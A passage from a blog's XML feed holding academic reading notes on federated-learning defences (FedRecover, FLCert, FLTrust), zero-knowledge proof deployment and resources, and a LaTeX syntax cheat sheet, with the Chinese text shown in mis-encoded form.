g_t^i=\overline{g}_t^i+\mathbf{H}_t^i\left(\hat{w}_t-\overline{w}_t\right),where\\    \mathbf{H}_t^i=\int_0^1\mathbf{H}\left(\overline{w}_t+z\left(\hat{w}_t-\overline{w}_t\right)\right)dz\end{aligned}\end{equation}\]</span> $$</p><p>å…¶ä¸­</p><ol type="1"><li><p><span class="math inline">\(\overline{w}_t\)</span> to denote the<strong>original global</strong></p></li><li><p><span class="math inline">\(\overline{g}_t^i\)</span> denote the<strong>original model update</strong> reported by the <spanclass="math inline">\(i\)</span>-th client in the <spanclass="math inline">\(t\)</span>-th round</p></li><li><p><span class="math inline">\(\hat{w}^t\)</span> denotes the<strong>recovered global model</strong> in the <spanclass="math inline">\(t\)</span>-th round of FedRecover.</p></li><li><p><span class="math inline">\(g^t_i\)</span> to denote the <spanclass="math inline">\(i\)</span>-th clientâ€™s <strong>exact modelupdate</strong> in the tth round of the recovery process if the clientcomputes it</p></li><li><p>æ¢¯åº¦ g æ˜¯æ¨¡å‹å‚æ•° w çš„å‡½æ•°ï¼Œ<span class="math inline">\(g =Q(w)\)</span>ï¼Œå…·ä½“å‡½æ•°å½¢å¼å–å†³äºä½¿ç”¨çš„ loss functionä»¥åŠæ¨¡å‹çš„ç»“æ„ã€‚</p></li></ol><p><span class="math display">\[Q&#39;(\overline{w}_t+z\left(\hat{w}_t-\overline{w}_t\right))=\mathbf{H}\left(\overline{w}_t+z\left(\hat{w}_t-\overline{w}_t\right)\right)\left(\hat{w}_t-\overline{w}_t\right)\]</span></p><p>åˆ™æœ‰ï¼š</p><p><span class="math display">\[\begin{equation}\begin{aligned}g_t^i - \overline{g}_t^i &amp;=\mathbf{H}_t^i\left(\hat{w}_t-\overline{w}_t\right)\\Q(1)-Q(0) &amp;= \int_0^1 Q^{\prime}(z) dz\end{aligned}\end{equation}\]</span></p><p>ç”±äºç›´æ¥è®¡ç®— integrated Hessian matrix æ¯”è¾ƒå›°éš¾ï¼Œæœ¬æ–‡ä½¿ç”¨äº† L-BFGSç®—æ³•æ¥è¿‘ä¼¼è®¡ç®—ã€‚</p><p>L-BFGS ç®—æ³•å±äºæœ€ä¼˜åŒ–ç®—æ³•æ–¹é¢çš„.</p><blockquote><p>L-BFGSï¼ˆLimited-memoryBroyden-Fletcher-Goldfarb-Shannoï¼‰ç®—æ³•æ˜¯ä¸€ç§å¸¸ç”¨äºæ— çº¦æŸä¼˜åŒ–é—®é¢˜çš„ä¼˜åŒ–ç®—æ³•ã€‚å®ƒæ˜¯BFGS ç®—æ³•çš„ä¸€ç§å˜ä½“ï¼Œç”¨äºè§£å†³é«˜ç»´é—®é¢˜ï¼Œç‰¹åˆ«æ˜¯å½“å­˜å‚¨ HessiançŸ©é˜µä¸å¯è¡Œæ—¶ã€‚</p><p>BFGSç®—æ³•æ˜¯ä¸€ç§æ‹Ÿç‰›é¡¿æ–¹æ³•ï¼Œæ—¨åœ¨å¯»æ‰¾å¤šå…ƒå‡½æ•°çš„å±€éƒ¨æå°å€¼ã€‚å®ƒä½¿ç”¨æ¢¯åº¦ä¿¡æ¯æ¥è¿‘ä¼¼ç›®æ ‡å‡½æ•°çš„æµ·æ£®çŸ©é˜µï¼ˆHessianmatrixï¼‰ï¼Œä»è€Œè¿›è¡Œä¼˜åŒ–ã€‚</p><p>L-BFGS ç®—æ³•é€šè¿‡é™åˆ¶å­˜å‚¨å’Œè®¡ç®— HessiançŸ©é˜µçš„å†…å­˜éœ€æ±‚ï¼Œè§£å†³äº†é«˜ç»´é—®é¢˜ä¸­çš„æ€§èƒ½é—®é¢˜ã€‚L-BFGSåªéœ€è¦å­˜å‚¨å°‘é‡çš„å†å²ä¿¡æ¯ï¼Œå¹¶é€šè¿‡è¿­ä»£æ¥é€æ­¥é€¼è¿‘ Hessian çŸ©é˜µçš„é€†ã€‚è¿™ä½¿å¾—L-BFGS åœ¨å¤„ç†å¤§è§„æ¨¡é—®é¢˜æ—¶è¡¨ç°ä¼˜å¼‚ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> academic </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>FLCert Provably Secure Federated Learning against Poisoning Attacks è®ºæ–‡é˜…è¯»ç¬”è®°</title>
      <link href="/blog/2023/08/04/academic/papers/flcert/"/>
      <url>/blog/2023/08/04/academic/papers/flcert/</url>
      
        <content type="html"><![CDATA[<p>FLcert æ˜¯å‘è¡¨åœ¨ TIFS'22ä¸Šçš„ä¸€ç¯‡å…³äºç¼“è§£è”é‚¦å­¦ä¹ æ¯’åŒ–æ”»å‡»çš„è®ºæ–‡,è®ºæ–‡ç›¸å…³å¼•ç”¨ä¸æ¥æºå¦‚ä¸‹ï¼š</p><ol type="1"><li><p>AAAI'21 version</p><p>Cao, Xiaoyu, Jinyuan Jia, and Neil Zhenqiang Gong. "Provably securefederated learning against malicious clients." Proceedings of the AAAIconference on artificial intelligence. Vol. 35. No. 8. 2021. PDF: <ahref="https://arxiv.org/abs/2102.01854">[2102.01854] Provably SecureFederated Learning against Malicious Clients</a></p></li><li><p>TIFS'22 version</p><p>Cao, Xiaoyu, et al. "Flcert: Provably secure federated learningagainst poisoning attacks." IEEE Transactions on Information Forensicsand Security 17 (2022): 3691-3705. PDF: <ahref="https://arxiv.org/pdf/2210.00584.pdf">FLCert: Provably SecureFederated Learning against Poisoning Attacks</a></p></li></ol><p>TIFS'22 è®ºæ–‡æ˜¯ AAAI'21 ä¸Šå¯¹åº”è®ºæ–‡çš„æ‰©å±•ï¼Œæœ¬æ–‡ä¸»è¦å¯¹ AAAI'21ä¸Šçš„è¯¥è®ºæ–‡è¿›è¡Œé˜…è¯»ç†è§£ï¼Œå¹¶æŒ‡å‡ºå…¶åœ¨ TIFS ä¸Šçš„æ‰©å±•éƒ¨åˆ†ã€‚</p><h2 id="background-and-motivation">Background and Motivation</h2><p>é’ˆå¯¹è”é‚¦å­¦ä¹ çš„æ¯’åŒ–æ”»å‡»ï¼Œç›®å‰é˜²å¾¡æ–¹æ³•æœ‰ Byzantine-robust aggregationrules, such as Krum [9], trimmed mean and median,FLtrustç­‰ã€‚ä½†æ˜¯è¿™äº›æ–¹æ³•éƒ½æ²¡æœ‰å¯¹æ¯’åŒ–æ”»å‡»æä¾›å¯è¯æ˜çš„å®‰å…¨ä¿è¯ï¼Œä¸èƒ½å¤Ÿä¿è¯é¢„æµ‹ç»“æœæ˜¯å¦æ”¶åˆ°æ¶æ„å®¢æˆ·ç«¯çš„å½±å“ã€‚</p><blockquote><p>However, these methods cannot provably guarantee that the predictedlabel for a testing example is not affected by malicious clients.</p></blockquote><h2 id="contributions">Contributions</h2><p>æœ¬æ–‡é€šè¿‡å°†é›†æˆå­¦ä¹  ensemble learning åº”ç”¨åœ¨è”é‚¦å­¦ä¹ ä¸­ï¼Œä¹Ÿå°±æ˜¯ensemble federated learning æ¥è§£å†³ä¸Šè¿°é—®é¢˜ã€‚</p><blockquote><p>å›é¡¾å‘¨å¿—åè¥¿ç“œä¹¦çš„è§£é‡Šï¼Œé›†æˆå­¦ä¹ é€šè¿‡æ„å»ºå¹¶ç»“åˆå¤šä¸ªå­¦ä¹ å™¨æ¥å®Œæˆå­¦ä¹ ä»»åŠ¡ï¼Œæœ‰æ—¶è¢«ç§°ä¸ºå¤šåˆ†ç±»å™¨ç³»ç»Ÿ(multi-classifier &gt; &gt; &gt; &gt; &gt; system)ã€åŸºäºå§”å‘˜ä¼šçš„å­¦ä¹ (committee-based learning) ç­‰ã€‚</p><p>é›†æˆå­¦ä¹ çš„ä¸€èˆ¬ç»“æ„ä¸æ­¥éª¤:</p><ol type="1"><li><p>å…ˆäº§ç”Ÿä¸€ç»„ individual learner</p><p>individual learneré€šå¸¸ç”±ä¸€ä¸ªç°æœ‰çš„å­¦ä¹ ç®—æ³•ä»è®­ç»ƒæ•°æ®äº§ç”Ÿï¼Œä¾‹å¦‚å†³ç­–æ ‘ã€ç¥ç»ç½‘ç»œ CNN ç­‰,å¦‚æœindividual learners ç®—æ³•ç›¸åŒï¼Œåˆ™ç§°ä¸ºåŒè´¨çš„ homogeneousï¼Œå¦åˆ™ç§°ä¸ºå¼‚è´¨çš„heterogeneousã€‚</p></li><li><p>å†ç”¨æŸç§ç»“åˆç­–ç•¥å°†å®ƒä»¬ç»“åˆèµ·æ¥</p><p>å¸¸ç”¨çš„ç»“åˆç­–ç•¥: å¯¹äºå›å½’æ¨¡å‹ï¼Œéœ€è¦é¢„æµ‹æ•°å€¼çš„ï¼Œå¸¸ç”¨å¹³å‡æ³•ï¼šç›´æ¥å¹³å‡averaging å’Œå¯¹ individual learner åŠ æƒå¹³å‡ weighted averagingå¯¹äºåˆ†ç±»æ¨¡å‹ï¼Œéœ€è¦é¢„æµ‹ç±»åˆ«çš„ï¼Œå¸¸ç”¨æŠ•ç¥¨æ³•ï¼šå¤šæ•°æŠ•ç¥¨ï¼ˆmajorityï¼‰votingå’ŒåŠ æƒæŠ•ç¥¨æ³• weighted voting</p></li></ol></blockquote><h3 id="æå‡ºçš„æ¡†æ¶å¦‚ä¸‹">æå‡ºçš„æ¡†æ¶å¦‚ä¸‹</h3><ol type="1"><li><p>å…ˆäº§ç”Ÿä¸€ç»„ individual learner</p><p>åœ¨æœ¬æ–‡ä¸­ï¼Œé€šè¿‡ randomly sampling a subset of clients ç”Ÿæˆä¸€ç»„ç»„çš„individual learnersï¼Œå…·ä½“çš„ï¼Œå‡è®¾æœ‰ N ä¸ª clientsï¼Œæ¯ç»„æœ‰ k ä¸ªclients,é‚£ä¹ˆé‡‡æ ·å¯èƒ½æœ‰æ’åˆ—æ•° <span class="math inline">\(C_N^k\)</span>ç§ï¼Œä¹Ÿå°±æ˜¯æœ‰ <span class="math inline">\(C_N^k\)</span> ç»„ï¼Œæ¯ç»„æœ‰ kä¸ªã€‚ç„¶åè®­ç»ƒ <span class="math inline">\(C_N^k\)</span> ä¸ªæ¨¡å‹ï¼Œå¾—åˆ°<span class="math inline">\(C_N^k\)</span> ä¸ª global models</p></li><li><p>ä½¿ç”¨ majority voting æ¥è§£å†³åˆ†ç±»é—®é¢˜ä¸­çš„æ ‡ç­¾é¢„æµ‹</p><p>ä½¿ç”¨å¾—åˆ°çš„ <span class="math inline">\(C_N^k\)</span> ä¸ª globalmodels å¯¹åŒä¸€æµ‹è¯•æ ·æœ¬è¿›è¡Œé¢„æµ‹ï¼Œä½¿ç”¨ majority votingï¼Œä¹Ÿå°±æ˜¯é¢„æµ‹çš„ labelç±»åˆ«æœ€å¤šçš„ä½œä¸ºæœ€ç»ˆçš„é¢„æµ‹ç»“æœã€‚</p></li></ol><p>ä»è€Œåœ¨è”é‚¦å­¦ä¹ ä¸­å®ç° provably guarantee that the predicted label fora testing example is not affected by malicious clients,ä¹Ÿå°±æ˜¯å¯ä»¥è¯æ˜ï¼Œæ ‡ç­¾é¢„æµ‹ç»“æœæœªå—åˆ°æ¶æ„å®¢æˆ·ç«¯çš„å½±å“ã€‚</p><h3 id="ç†è®ºæˆæœ">ç†è®ºæˆæœ</h3><ol type="1"><li>our ensemble global model provably predicts the same label for atesting example x when the number of malicious clients is no larger thana threshold, which we call certified security level.</li><li>The derived bound is tight, i.e., when no assumptions are made onthe base federated learning algorithm, it is impossible to derive acertified security level that is larger than ours.</li></ol><p>ç¼ºç‚¹ï¼šNote that the certified security level may be different fordifferent testing examples.</p><h3 id="å®ç°å›°éš¾ä¸è§£å†³æ–¹æ¡ˆ">å®ç°å›°éš¾ä¸è§£å†³æ–¹æ¡ˆ</h3><p><span class="math inline">\(p_i\)</span> label probability: define<span class="math inline">\(p_i\)</span> as the fraction of the <spanclass="math inline">\(C_N^k\)</span> global models that predict label ifor x, where <span class="math inline">\(i = 1, 2,\cdots,L\)</span>.</p><p>è®¡ç®— certified security level éœ€è¦<spanclass="math inline">\(C_N^k\)</span>ä¸ªé¢„æµ‹ç»“æœä¸­ largest and secondlargest labelprobabilitiesï¼Œä¹Ÿå°±æ˜¯éœ€è¦çŸ¥é“æ ‡ç­¾é¢„æµ‹ç»“æœä¸­é¢„æµ‹æ•°é‡ç¬¬ä¸€å¤šå’Œç¬¬äºŒå¤šçš„æ ‡ç­¾çš„é¢„æµ‹æ•°é‡ã€‚</p><p>å½“ <span class="math inline">\(C_N^k\)</span>è¾ƒå°æ—¶ï¼Œè®¡ç®—è¿™ç§è¿˜å¯ä»¥ï¼Œä½†æ˜¯å½“ <spanclass="math inline">\(C_N^k\)</span> å¾ˆå¤§æ—¶ï¼Œè®¡ç®—é‡å¤ªå¤§ï¼Œæ‰€ä»¥æœ¬æ–‡develop a Monte Carlo algorithm to estimate them with probabilisticguarantees via training N instead of <spanclass="math inline">\(C_N^k\)</span> global models.</p><blockquote><p>è’™ç‰¹å…‹ç½—ç®—æ³•ï¼ˆMonte Carlomethodï¼‰ï¼šä»¥æ¦‚ç‡ç»Ÿè®¡ç†è®ºä¸ºæŒ‡å¯¼çš„ã€é€šè¿‡éšæœºæŠ½æ ·æ¥æ¥è¿‘ä¼¼è®¡ç®—é—®é¢˜çš„è§£æˆ–ç»“æœä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè’™ç‰¹å¡ç½—ç®—æ³•çš„ç‰¹ç‚¹æ˜¯ï¼Œé‡‡æ ·è¶Šå¤šï¼Œè¶Šè¿‘ä¼¼æœ€ä¼˜è§£ï¼Œè€Œæ°¸è¿œä¸æ˜¯æœ€ä¼˜è§£ã€‚</p></blockquote><h2 id="æå‡ºçš„-ensemble-federated-learning-æ¡†æ¶ç»†èŠ‚">æå‡ºçš„ EnsembleFederated Learning æ¡†æ¶ç»†èŠ‚</h2><ol type="1"><li><p>define provable security guarantees against maliciousclients:</p><p><span class="math inline">\(h(C&#39;,x) = h(C,x), âˆ€C&#39;, M(C&#39;)â‰¤ m^âˆ—\)</span></p><p>C æ˜¯ the set of n clientsï¼ŒC' æ˜¯ the set of n clients with maliciousonesã€‚M(C') æ˜¯ the number of malicious clients in C'ï¼Œ<spanclass="math inline">\(m^âˆ—\)</span> æ˜¯å¯ä»¥æ‰¿å—çš„æœ€å¤š malicious clientä¸ªæ•°ï¼Œä¹Ÿå°±æ˜¯ the certified security levelï¼Œ<spanclass="math inline">\(h(C,x)\)</span> æ˜¯ the label predicted by theensemble global model trained on C for xã€‚</p></li><li><p>Deriving certified security level using exact labelprobabilities</p><p>è®¾ <span class="math inline">\(p_y\)</span>ï¼š the largest label yprobabilityï¼Œ<span class="math inline">\(p_y&#39;\)</span>: the labelprobability of y when there are malicious clientsï¼Œ<spanclass="math inline">\(p_z\)</span>ï¼šthe second largest label zprobabilityï¼Œ<span class="math inline">\(p_z&#39;\)</span>: the labelprobability of z when there are malicious clientsã€‚è®¾æœ‰ m ä¸ª maliciousclients,åˆ™æœ‰ <span class="math inline">\(1 -\frac{C_{n-m}^k}{C_n^k}\)</span> æ¯”ä¾‹çš„é‡‡æ ·ç»„è‡³å°‘å«æœ‰ä¸€ä¸ª maliciousclientsï¼Œæœ€åçš„æƒ…å†µä¸‹ï¼Œä¼šæœ‰å¦‚ä¸‹å…¬å¼ï¼š</p><p><span class="math display">\[p_y&#39; = p_y - 1 -\frac{C_{n-m}^k}{C_n^k}\]</span></p><p><span class="math display">\[p_z&#39; = p_z + 1 -\frac{C_{n-m}^k}{C_n^k}\]</span></p><p>å› æ­¤ï¼Œä¸ºäº†ä¿è¯é¢„æµ‹ç»“æœæ­£ç¡®ï¼Œéœ€è¦</p><p><span class="math display">\[\begin{equation}     \begin{aligned}         p_y&#39; &amp;&gt; p_z&#39;\\         p_y - 1 - \frac{C_{n-m}^k}{C_n^k} &amp;&gt; p_z + 1 -\frac{C_{n-m}^k}{C_n^k}\\         p_y - p_z &amp;&gt; 2 - \frac{2C_{n-m}^k}{C_n^k}     \end{aligned}\end{equation}\]</span></p><p>å› æ­¤ï¼Œcertified security level <spanclass="math inline">\(m^*\)</span> å¯ä»¥é€šè¿‡ä¸Šè¿°å…¬å¼è®¡ç®—å¾—åˆ°ã€‚</p></li><li><p>Deriving certified security level using approximate labelprobabilities:</p><p><span class="math inline">\(p_y - p_z &gt;= \underline{p_y} -\overline{p_z}\)</span>, where <spanclass="math inline">\(\underline{p_y}\)</span> is the lower bound of<span class="math inline">\(p_y\)</span>, <spanclass="math inline">\(\overline{p_z}\)</span> is the upper bound of<span class="math inline">\(p_z\)</span>.</p><p>propose a Monte Carlo algorithm to estimate a lower bound <spanclass="math inline">\(p_y\)</span> and an upper bound <spanclass="math inline">\(p_z\)</span> via only training N of the <spanclass="math inline">\(C_{n-m}\)</span> global models.</p><p>å¾—å‡º <span class="math inline">\(\underline{p_y} - \overline{p_z}&gt; 2 - \frac{2C_{n-m}^k}{C_n^k}\)</span></p><p>æœ€åï¼Œå‘ç°æ ¹æ®ä¸Šè¿°å…¬å¼å¾—å‡ºçš„ the certified security level <spanclass="math inline">\(m^*\)</span> å¹¶ä¸ tightï¼Œå› ä¸º <spanclass="math inline">\(m^*\)</span> åº”è¯¥æ˜¯ <spanclass="math inline">\(\frac{1}{C_n^k}\)</span> çš„æ•´æ•°å€ã€‚å› æ­¤éœ€è¦</p><p>normalize <span class="math inline">\(\underline{p_y} -\overline{p_z}\)</span> ä¸ºå…¶å€æ•°ï¼š</p><p>æ‰¾åˆ°æœ€æ¥è¿‘ x çš„ n çš„å€æ•°çš„æ•´æ•°ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å…¬å¼ï¼š<code>nearest_multiple = n * round(x / n)</code>ã€‚å¯ä»¥ä½¿ç”¨å‘ä¸Šå–æ•´æˆ–å‘ä¸‹å–æ•´çš„æ–¹æ³•æ¥å®ç°ä¸åŒçš„å–èˆæ–¹å¼ï¼š</p></li><li><p>æ‰©å±•ä¸º TIFSæœŸåˆŠçš„æ–‡ç« å¯¹åˆ†ç»„çš„æ–¹æ³•è¿›è¡Œäº†åˆ’åˆ†ï¼Œæå‡ºäº†ä¸¤ç§åˆ†ç»„æ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯ FLCert-P å’ŒFLCert-D</p><p>éšæœºæ€§çš„ FLCert-P: randomly samples clients in each group ç¡®å®šæ€§çš„FLCert-D: divides clients to disjoint groups deterministically</p></li></ol><h2 id="æ€»ç»“">æ€»ç»“</h2><ol type="1"><li>è®ºæ–‡åº”ç”¨é›†æˆå­¦ä¹ æ¥è§£å†³ poisioning attacks çš„æƒ³æ³•å¾ˆæ–°é¢–</li><li>è§£å†³é—®é¢˜çš„æ€è·¯å¾ˆæµç•…ï¼Œé‡åˆ°é—®é¢˜å°±æ‰¾åŸå› å»è§£å†³é—®é¢˜ã€‚</li><li>æ•°è®ºçŸ¥è¯†çš„åº”ç”¨å¾ˆå¥½</li></ol><p>å¯ä»¥å€Ÿé‰´çš„ç‚¹ï¼š</p><ul class="task-list"><li><label><input type="checkbox" />é›†æˆå­¦ä¹ åŠå…¶åº”ç”¨</label></li><li><label><input type="checkbox" />è’™ç‰¹å¡æ´›æ–¹æ³•</label></li></ul><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><ol type="1"><li>å‘¨å¿—å æœºå™¨å­¦ä¹  è¥¿ç“œä¹¦</li><li><a href="https://bbs.huaweicloud.com/blogs/254288">Algorithm ä¹‹MCï¼šMonte Carlo methodè’™ç‰¹Â·å¡ç½—æ–¹æ³•çš„ç®€ä»‹ã€å®ç°ã€åº”ç”¨-äº‘ç¤¾åŒº-åä¸ºäº‘</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> academic </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>FLTrust Byzantine-robust Federated Learning via Trust Bootstrapping è®ºæ–‡é˜…è¯»ç¬”è®°</title>
      <link href="/blog/2023/08/04/academic/papers/fltrust/"/>
      <url>/blog/2023/08/04/academic/papers/fltrust/</url>
      
        <content type="html"><![CDATA[<p>NDSS'21 <a href="https://arxiv.org/abs/2012.13995">FLTrust:Byzantine-robust Federated Learning via Trust Bootstrapping</a></p><p>FLTrust ä¸»è¦å·¥ä½œï¼š åœ¨äºåœ¨ server ç«¯ maintain ä¸€ä»½å°çš„å¹²å‡€çš„æ•°æ®é›†ï¼Œä¸client åŒæ­¥è®­ç»ƒ root/server modelã€‚åŸºäºæ¢¯åº¦ä¸‹é™æ–¹å‘çš„ä¸€è‡´æ€§ï¼Œé‡‡ç”¨ cosinesimilarity æ¥è¡¡é‡ root ä¸ client gradientä¹‹é—´çš„ç›¸ä¼¼æ€§ï¼Œä»è€Œåˆ¤æ–­æ˜¯å¦æœ‰æ¶æ„clientã€‚æ­¤å¤–é˜²æ­¢æ¶æ„æ¢¯åº¦è¿‡å¤§ï¼Œå¯¼è‡´æ–¹å‘åç¦»ï¼Œé‡‡ç”¨äº†æ¢¯åº¦è£å‰ªçš„æ–¹æ³•ã€‚</p><p>è¯¥è®ºæ–‡çš„è¯¦ç»†å†…å®¹è‡ªå·±æ›¾ç»åšè¿‡ PPT æ±‡æŠ¥ <ahref="https://realyee.github.io/blog/assets/fltrust.pdf">Fltrust PPTlink</a>, å¹¶ä¸”é’ˆå¯¹ poisoning attacks to Byzantine-robust federatedlearning å¯¹ä»¥ä¸‹ä¿©ç¯‡æ–‡ç« åšäº†ä¸ª poster æ±‡æ€»ï¼Œç»ƒä¹  poster åˆ¶ä½œ <ahref="https://realyee.github.io/blog/assets/poisoning_attack_poster.pdf">Posterlink</a>ã€‚</p><ol type="1"><li><p>Fang, Minghong, et al. "Local model poisoning attacks toByzantine-Robust federated learning." 29th USENIX security symposium(USENIX Security 20). 2020.</p></li><li><p>Cao, Xiaoyu, et al. "Fltrust: Byzantine-robust federated learningvia trust bootstrapping." arXiv preprint arXiv:2012.13995(2020).</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> academic </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>zk with programmability</title>
      <link href="/blog/2023/05/30/crypto/zk/specific2program/"/>
      <url>/blog/2023/05/30/crypto/zk/specific2program/</url>
      
        <content type="html"><![CDATA[<h1 id="zk-with-programmability">zk with programmability</h1><p>There are limitations for the Schnoor protocol based on discre logproblem, a common seen zk example. It can only support a specificcomputation, <span class="math inline">\(x = log_g(y)\)</span>, lackingof programmability.</p><p>For general arithmetic computation, Groth 16, PLONK is popular.</p><p>Groth 16:</p><ol type="1"><li>Support arbitrary arithmetic computation with goodprogrammability</li><li>Fast prover time</li><li>Millisecond level verifying time</li><li>Constant proof size even if the arithemtic computation iscomplex</li></ol><h2 id="wasm-deployment">WASM Deployment</h2><p>Previous Approach:</p><ol type="1"><li>Compile ZKP code into binary and distribute the binary to usersDrawback:</li><li>Users prefer to not download a binary</li><li>Complexity in supporting many backends (e.g., Windows, MAĞ¡, Ubuntu,etc)</li></ol><p>Recent Trend:</p><ol type="1"><li>Compile ZKP code to web assembly (WASM) backend</li><li>Distribute as a browser extension</li></ol><p>Benefits:</p><ol type="1"><li>Users do not need to download a binary</li><li>Directly support diverse backend</li></ol><p>WASM Deployment: Performance Bottleneck</p><ol type="1"><li>Slow down compared to native CPU execution<ol type="1"><li>For proving ZKP circuit at Manta Network</li><li>2~3 seconds latency on native CPU</li><li>v.s. 20~30 seconds latency on WASM</li></ol></li><li>Bottleneck: MSM(Multi scalar multiplication computation)Computation</li><li>ZPrize: Optimize MSM computation on WASM<ol type="1"><li>Better algorithm to reduce #finite field computations</li><li>Better exploitation of WASM backend properties E.g., hand-writtenassembly code</li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>zk èµ„æ–™æ±‡æ€»</title>
      <link href="/blog/2023/04/30/crypto/zk/great_resource/"/>
      <url>/blog/2023/04/30/crypto/zk/great_resource/</url>
      
        <content type="html"><![CDATA[<h1 id="èµ„æ–™">èµ„æ–™</h1><h2 id="ç†è®ºèµ„æ–™">ç†è®ºèµ„æ–™</h2><p><ahref="https://github.com/zyw271828/wahzw-zh-cn">zyw271828/wahzw-zh-cn:Why and How zk-SNARK Works ç®€ä½“ä¸­æ–‡ç‰ˆ</a></p><p><ahref="https://crypto.stanford.edu/~saba/slides/Quals.pdf">Quals.pdf</a></p><h2 id="ä»£ç èµ„æ–™">ä»£ç èµ„æ–™</h2><ol type="1"><li><p><a href="https://github.com/GarryFCR/Rsa_Zkp">Golang:GarryFCR/Rsa_Zkp: An Efficient and Privacy preserving implementation forthe Set membership problem using Rsa Accumulators coupled withCommit-Prove-Snark</a></p></li><li><p>CCF-B 2023 Paper: Validating the integrity of ConvolutionalNeural Network predictions based on zero-knowledge proof</p><p><ahref="https://github.com/Data-Security-Research-Lab/CNN-prediction-ZKP-scheme/tree/master">Code:Data-Security-Research-Lab/CNN-prediction-ZKP-scheme: The codecorresponds to the paper â€œValidating the integrity of ConvolutionalNeural Network predictions based on Zero-Knowledge Proofâ€œ</a></p></li><li><p>TDSC2023: zk-AuthFeed: Protecting Data Feed to Smart Contractswith Authenticated Zero Knowledge Proof <ahref="https://github.com/wanzhiguo/libsnark-zkauthfeed">wanzhiguo/libsnark-zkauthfeed:libsnark: a C++ library for zkSNARK proofs [+ interface forjsnark/Pinocchio ]</a></p></li></ol><h2 id="ä¸»é¢˜å‹">ä¸»é¢˜å‹</h2><p><ahref="https://github.com/worldcoin/awesome-zkml">worldcoin/awesome-zkmlï¼šawesome-zkmlå­˜å‚¨åº“</a></p><p><ahref="https://github.com/LeastAuthority/moonmath-manual">LeastAuthority/moonmath-manualï¼šä¸ºä»»ä½•æœ‰å…´è¶£äº†è§£å’Œé‡Šæ”¾zk-SNARK æ½œåŠ›çš„äººï¼ˆä»åˆå­¦è€…åˆ°ä¸“å®¶ï¼‰æä¾›çš„èµ„æºã€‚</a></p>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å¸¸ç”¨ LaTeX è¯­æ³•æ€»ç»“</title>
      <link href="/blog/2023/04/16/misc/latex/latex_grammars/"/>
      <url>/blog/2023/04/16/misc/latex/latex_grammars/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ–‡æ€»ç»“è‡ªå·±éªŒè¯è¿‡çš„ LaTeX è¯­æ³•ï¼Œé€æ¸ç§¯ç´¯æ›´æ–°ï¼Œä½¿ç”¨æ–¹å¼ï¼šCtrl+Fæœç´¢å…³é”®å­—ï¼Œç›´æ¥æ‹¿è¿‡æ¥ç”¨</p><h2 id="å»å“ªé‡Œæ‰¾-latex-æ¨¡æ¿æˆ–è€…ä»£ç ">å»å“ªé‡Œæ‰¾ LaTeX æ¨¡æ¿æˆ–è€…ä»£ç ï¼Ÿ</h2><ol type="1"><li>Overleaf çš„æ•™ç¨‹æ‰¾ä¼ªä»£ç ,å›¾ç‰‡ä¹‹ç±»çš„ä»£ç æ¨¡ç‰ˆ</li><li>Overleaf template æ‰¾ posterï¼Œcv ç­‰ å„ç§ä¼˜è´¨æ¨¡æ¿</li><li><a href="https://www.latexstudio.net">LaTeXStudio</a></li></ol><h2 id="ç”»å›¾">ç”»å›¾</h2><p><ahref="https://blog.csdn.net/a6822342/article/details/80533135">Latexä¸­æ’å…¥å¤šå¼ å›¾ç‰‡ï¼Œå®ç°å¹¶æ’æ’åˆ—æˆ–è€…å¤šè¡Œå¤šåˆ—æ’åˆ—_æ³½ç±³çš„åšå®¢-CSDN åšå®¢_texå¤šå¼ å›¾å¹¶åˆ—ç”»å›¾</a></p><h2 id="è°ƒæ•´å›¾ç‰‡å¤§å°">è°ƒæ•´å›¾ç‰‡å¤§å°</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\includegraphics[width=15cm, height=6cm, keepaspectratio]&#123;name1&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(\includegraphics[width=\textwidth, height=\textheight]&#123;figure.pdf&#125;)</span><br></pre></td></tr></table></figure><p>Use the scale=1.5 option in the \includegraphics command to resizethe image to 150% of its original size. That is, </p><p><code>keepaspectratio</code>:ä¿æŒæ¯”ä¾‹ä¸å˜ï¼Œä¸€èˆ¬è°ƒæ•´é•¿å®½ä¹‹ä¸€ï¼Œç„¶åè®©å®ƒè‡ªé€‚åº”è°ƒæ•´ --- [width=0.3,keepaspectratio,angle=0] this will control the size of the figure,change the fraction to your desired one. say 0.25, if do not wanna keepthe aspect ration same, use "height = 0.5 cm" like setting. you canchange the angular position as well.</p><p><code>\includegraphics[width=10cm,height=10cm,keepaspectratio]&#123;image.png&#125;</code></p><h2 id="latex-è·¨æ–‡ä»¶å¼•ç”¨">latex è·¨æ–‡ä»¶å¼•ç”¨</h2><p>è®¾å®šå…¬å¼åˆå§‹å€¼ï¼š åœ¨è¦è®¾ç½®çš„ eqationå‰é¢ï¼Œå†™ï¼š<code>\setcounter&#123;equation&#125;&#123;66&#125;</code>ï¼Œå³ä» 66 å¼€å§‹ä½œä¸º 0åˆå§‹å€¼ã€‚</p><p>åœ¨å¼•ç”¨çš„æ–‡ä»¶é‡ŒåŠ ä¸Šè¢«å¼•ç”¨çš„å¤–éƒ¨æ–‡ä»¶åï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\usepackage&#123;xr&#125;</span><br><span class="line">\externaldocument&#123;article1&#125;</span><br></pre></td></tr></table></figure><h2id="package-caption-warning-unsupported-document-class-or-package-detected">Packagecaption Warning: Unsupported document class (or 